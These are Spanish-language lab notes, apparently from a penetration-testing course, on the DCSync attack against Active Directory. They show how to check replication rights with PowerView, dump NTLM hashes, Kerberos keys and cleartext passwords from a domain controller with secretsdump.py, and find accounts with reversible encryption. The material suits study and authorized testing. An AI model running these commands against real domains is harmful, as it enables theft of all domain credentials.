## Que es DCSync y como funciona

Es una tecnica para robar la BBDD de pass de AD usando el Protocolo Remoto del Servicio de Replicacion de Directorios integrado que es usado por los controladores de dominio para replicar los datos del dominio

Nos permite imitar un DC para obtener los hashes NTLM de los usuarios

Solicitaremos a un DC que replique las creds a traves del derecho `DS-Replication-Get-Changes-All`

Para esto tenemos que tener una cuenta con derechos para realizar la replicacion del dominio:

- Replicating Directory Changes
- Replicating Directory Changes All

Ambos establecidos. Los Domain/Enterprise Admins lo tienen por defecto

1. Miramos los derechos de replicacion de adunn a traves de ADSI Edit

![[Pasted image 20260928160824.png]]

	Es común durante una evaluación encontrar otras cuentas que tienen estos derechos, y una vez comprometidas, su acceso puede ser utilizado para obtener el hash de contraseña NTLM


2. Miramos la pertenencia a grupos de adunn

```
Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
![[Pasted image 20260928160921.png]]

	Vemos que es un usuario estandar

3. Confirmamos con PowerView que es un usuario estandar. Necesitamos el SID del usuario que salio en el comando anterior. Con esto veremos si tiene derechos de replicacion

```
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
![[Pasted image 20260928161132.png]]

	Si tuvieramos el derecho WriteDacl sobre un usuario que tuvieramos control, podriamos modificar sus derechos para añadirles los necesarios para realizar DCSync con esa cuenta


4. Extraemos los hashes del DC al confirmar que tenemos privs de DCSync. Usamos -just-dc para extraer hashes NTLM y tickets Kerberos

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
![[Pasted image 20260928161418.png]]

- -just-dc-ntlm: si solo queremos hashes NTLM
- -just-dc-user <\USERNAME>: extraer datos solo de un usuario especifico
- -pwd-last-set: ver cuando se cambio la ultima contraseña de cada cuenta
- -history: volcar el historial de contraseñas
- -user-status: comprobar si un usuario esta deshabilitado


5. Si revisamos los archivos creados con -just-dc veremos que hay 3 tipos: uno con hashes NTLM, otro con claves Kerberos y uno con claves en texto plano NTDS (cuentas con cifrado reversible encendido)

```
ls inlanefreight_hashes*
```

## Cifrado reversible

Es raro encontrar cuentas con esto. Suelen ser cuentas para dar soporte a aplicaciones que usan ciertos protocolos que requieren la pass de un usuario para autenticacion

![[Pasted image 20260928161859.png]]

Se almacenan utilizando cifrado RC4. El truco aquí es que la clave necesaria para descifrarlas se almacena en el registro (la [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) y puede ser extraída por un Administrador de Dominio o equivalente. Herramientas como `secretsdump.py` descifrarán cualquier contraseña almacenada con cifrado reversible

Podemos enumerar estas cuentas usando Get-ADUser:

```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
![[Pasted image 20260928162037.png]]

Podemos ver que una cuenta, `proxyagent`, tiene la opción de cifrado reversible activada también con PowerView::

```
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
![[Pasted image 20260928162101.png]]

Notaremos que la herramienta descifró la contraseña y nos proporcionó el valor en texto plano.

```
cat inlanefreight_hashes.ntds.cleartext
```
![[Pasted image 20260928162120.png]]
